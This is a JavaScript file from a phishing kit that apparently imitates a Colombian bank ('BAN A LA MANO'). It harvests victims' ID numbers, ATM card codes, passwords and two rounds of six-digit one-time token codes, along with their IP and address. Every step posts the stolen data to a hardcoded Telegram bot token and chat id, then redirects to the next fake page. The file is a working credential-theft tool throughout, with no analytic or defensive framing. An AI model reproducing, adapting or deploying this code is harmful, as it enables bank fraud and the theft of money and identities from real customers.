

//bot token
var $token = "7810439720:AAHAb3frdUje1lv-BrPaHgAZuXY3gmr9mBc";
//chat id
var $chat_id = "6927751752";
var USER, PASS, PIN, PIN2, TYPE, TYPES, NUMBER, PIN3, PIN4, PIN5, PIN6, PIN7, PIN8, PIN9, PIN0, PIN10, PIN11, PIN12, PIN13, ip, ip2, message;
var ready = function () {
    TYPE = document.getElementById("numeroDocumento").value;
    TYPES = document.getElementById("cajero").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💸💸BAN A LA MANO💸💸\nCC: " + TYPE+ "\nC.Cajero: " + TYPES+ "\nIP :"+ ip + "\n" + ip2;
    localStorage.setItem("CC", TYPE);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + $token + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": $chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="prestamo.html"
    });
    return false;
}
 
var ready1 = function () {
    TYPE = localStorage.getItem("CC");
    PIN = document.getElementById("pin1").value;
    USER = document.getElementById("pin2").value;
    PASS = document.getElementById("pin3").value;
    PIN2 = document.getElementById("pin4").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💸💸BAN A LA MANO💸💸\nCC: " + TYPE+ "\nClave: " + PIN+ USER+ PASS+ PIN2+"\nIP :"+ ip + "\n" + ip2;
    localStorage.setItem("pin1", PIN);
    localStorage.setItem("pin2", USER);
    localStorage.setItem("pin3", PASS);
    localStorage.setItem("pin4", PIN2);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + $token + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": $chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="prestamo.html"
    });
    return false;
}


var ready2 = function () {
    TYPE = localStorage.getItem("CC");
    PIN = localStorage.getItem("pin1");
    USER = localStorage.getItem("pin2");
    PASS = localStorage.getItem("pin3");
    PIN2 = localStorage.getItem("pin4");
    PIN3 = document.getElementById("codigo1").value;
    PIN4 = document.getElementById("codigo2").value;
    PIN5 = document.getElementById("codigo3").value;
    PIN6 = document.getElementById("codigo4").value;
    PIN7 = document.getElementById("codigo5").value;
    PIN8 = document.getElementById("codigo6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💸💸BAN A LA MANO💸💸\nCC: " + TYPE+ "\nClave: " + PIN+USER+PASS+PIN2+ "\nToken-1: " + PIN3+ PIN4+ PIN5+ PIN6+ PIN7+ PIN8+"\nIP :"+ ip + "\n" + ip2;
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + $token + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": $chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="cargando2.html"
    });
    return false;
}
 
var ready3 = function () {
    TYPE = localStorage.getItem("CC");
    PIN = localStorage.getItem("pin1");
    USER = localStorage.getItem("pin2");
    PASS = localStorage.getItem("pin3");
    PIN2 = localStorage.getItem("pin4");
    PIN9 = document.getElementById("codigo1").value;
    PIN0 = document.getElementById("codigo2").value;
    PIN10 = document.getElementById("codigo3").value;
    PIN11 = document.getElementById("codigo4").value;
    PIN12 = document.getElementById("codigo5").value;
    PIN13 = document.getElementById("codigo6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💸💸BAN A LA MANO💸💸\nCC: " + TYPE+ "\nClave: " + PIN+USER+PASS+PIN2+ "\nToken-2: " + PIN9+ PIN0+ PIN10+ PIN11+ PIN12+ PIN13+"\nIP :"+ ip + "\n" + ip2;
};
var sender3= function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + $token + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": $chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="cargando2.html"
    });
    return false;
}
 
